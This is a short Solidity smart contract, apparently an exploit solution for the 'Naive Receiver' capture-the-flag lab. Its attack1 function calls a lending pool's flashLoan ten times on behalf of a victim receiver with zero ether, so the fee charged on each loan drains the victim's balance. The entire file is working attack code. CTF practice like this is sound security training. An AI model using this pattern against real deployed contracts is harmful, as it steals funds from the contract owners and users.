// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../naive-receiver/NaiveReceiverLenderPool.sol";
contract NaiveA {
    NaiveReceiverLenderPool public attacker;
    constructor(address payable attack_address){
        attacker = NaiveReceiverLenderPool(attack_address);
    }
    function attack1(address victim ) public {
        for (uint i =0; i < 10; i++){
            attacker.flashLoan(victim, 0 ether);
        }
    }

}